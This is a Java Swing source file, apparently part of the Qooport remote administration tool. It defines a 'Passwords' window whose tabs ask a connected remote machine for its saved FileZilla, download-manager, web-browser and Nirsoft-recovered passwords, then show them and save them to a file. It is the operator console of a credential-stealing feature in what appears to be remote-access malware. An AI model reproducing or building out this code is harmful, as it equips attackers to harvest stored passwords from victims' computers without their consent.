package qooport.modulos.pc;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import qooport.asociado.Asociado;
import qooport.utilidades.Util;

public class Passwords extends JFrame {

    private Asociado servidor;
    private JTabbedPane jTabbedPane1;
    public JTextArea passFZ;
    public JTextArea passDM;
    public JTextArea passWB;
    public JTextArea passNirsoft;

    public Passwords(Asociado servidor) {
        initComponents();
        this.servidor = servidor;
    }

    private void initComponents() {
        jTabbedPane1 = new JTabbedPane();
        /////////////////////////////////////////////
//                FILEZILLA
        /////////////////////////////////////////////
        JPanel panelFileZila = new JPanel();
        JToolBar b1 = new JToolBar();
        b1.setFloatable(false);
        JButton btnPassFZ = new JButton();
        JScrollPane jScrollPane1;
        jScrollPane1 = new JScrollPane();
        btnPassFZ.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnPassFZ.setVisible(true);
        btnPassFZ.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Passwords.this.btnPedirPassFZ(evt);
            }
        });
        b1.add(btnPassFZ);

        JButton btnGuardar_FZ = new JButton();
        btnGuardar_FZ.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar_FZ.setVisible(true);
        btnGuardar_FZ.setText("Guardar");
        btnGuardar_FZ.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(passFZ.getText());
            }
        });
        b1.add(btnGuardar_FZ);

        passFZ = new JTextArea();
        jScrollPane1.setViewportView(this.passFZ);
        panelFileZila.setLayout(new BorderLayout());
        panelFileZila.add(jScrollPane1, BorderLayout.CENTER);
        panelFileZila.add(b1, BorderLayout.SOUTH);
        /////////////////////////////////////////////
//                DOWNLOD MANAGER
        /////////////////////////////////////////////
        JPanel paneldm = new JPanel();
        JToolBar b2 = new JToolBar();
        b2.setFloatable(false);
        JButton btnPassDM = new JButton();
        JScrollPane jScrollPane2;
        jScrollPane2 = new JScrollPane();
        btnPassDM.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnPassDM.setVisible(true);
        btnPassDM.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Passwords.this.btnPedirPassDM(evt);
            }
        });
        b2.add(btnPassDM);

        JButton btnGuardar_DM = new JButton();
        btnGuardar_DM.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar_DM.setVisible(true);
        btnGuardar_DM.setText("Guardar");
        btnGuardar_DM.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(passDM.getText());
            }
        });
        b2.add(btnGuardar_DM);

        passDM = new JTextArea();
        jScrollPane2.setViewportView(this.passDM);
        paneldm.setLayout(new BorderLayout());
        paneldm.add(jScrollPane2, BorderLayout.CENTER);
        paneldm.add(b2, BorderLayout.SOUTH);
        /////////////////////////////////////////////
//                NIRSOFT -WEBBROWSER
        /////////////////////////////////////////////
        JPanel panelwb = new JPanel();
        JToolBar b3 = new JToolBar();
        b3.setFloatable(false);
        JButton btnPassWB = new JButton();
        JScrollPane jScrollPane3;
        jScrollPane3 = new JScrollPane();
        btnPassWB.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnPassWB.setVisible(true);
        btnPassWB.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Passwords.this.btnPedirPassWB(evt);
            }
        });
        b3.add(btnPassWB);

        JButton btnGuardar_WB = new JButton();
        btnGuardar_WB.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar_WB.setVisible(true);
        btnGuardar_WB.setText("Guardar");
        btnGuardar_WB.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(passWB.getText());
            }
        });
        b3.add(btnGuardar_WB);

        passWB = new JTextArea();
        jScrollPane3.setViewportView(this.passWB);
        panelwb.setLayout(new BorderLayout());
        panelwb.add(jScrollPane3, BorderLayout.CENTER);
        panelwb.add(b3, BorderLayout.SOUTH);
        /////////////////////////////////////////////
//                NIRSOFT
        /////////////////////////////////////////////
        JPanel panelps = new JPanel();
        JToolBar b4 = new JToolBar();
        b4.setFloatable(false);
        JButton btnPassPS = new JButton();
        JScrollPane jScrollPane4;
        jScrollPane4 = new JScrollPane();
        btnPassPS.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnPassPS.setVisible(true);
        btnPassPS.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Passwords.this.btnPedirPassNirsoft(evt);
            }
        });
        b4.add(btnPassPS);

        JButton btnGuardar_Nirsoft = new JButton();
        btnGuardar_Nirsoft.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar_Nirsoft.setVisible(true);
        btnGuardar_Nirsoft.setText("Guardar");
        btnGuardar_Nirsoft.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(passNirsoft.getText());
            }
        });
        b4.add(btnGuardar_Nirsoft);

        passNirsoft = new JTextArea();
        jScrollPane4.setViewportView(this.passNirsoft);
        panelps.setLayout(new BorderLayout());
        panelps.add(jScrollPane4, BorderLayout.CENTER);
        panelps.add(b4, BorderLayout.SOUTH);
        //TABS
        this.jTabbedPane1.addTab("FileZilla", Util.cargarIcono16("/resources/filezilla.png"), panelFileZila
        );
        this.jTabbedPane1.addTab("Download Manager", Util.cargarIcono16("/resources/pass.png"), paneldm
        );
        this.jTabbedPane1.addTab("Navegador Web", Util.cargarIcono16("/resources/browser.png"), panelwb
        );
        this.jTabbedPane1.addTab("Nirsoft", Util.cargarIcono16("/resources/pass.png"), panelps
        );
        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
        this.add(jTabbedPane1, BorderLayout.CENTER);
        this.setSize(600, 450);
        this.setResizable(true);
        this.setIconImage(Util.cargarIcono16("/resources/pass.png").getImage());
        this.setVisible(true);
        pack();
    }

    private void btnPedirPassFZ(ActionEvent evt) {
        passFZ.setText("Solicitando información...");
        servidor.pedirFileZillaPass();
    }

    private void btnPedirPassDM(ActionEvent evt) {
        passDM.setText("Solicitando información...");
        servidor.pedirDMPass();
    }

    private void btnPedirPassWB(ActionEvent evt) {
        passWB.setText("Solicitando información...");
        servidor.pedirWBPass();
    }

    private void btnPedirPassNirsoft(ActionEvent evt) {
        passNirsoft.setText("Solicitando información...");
        servidor.pedirNirSoftPass();
    }

}
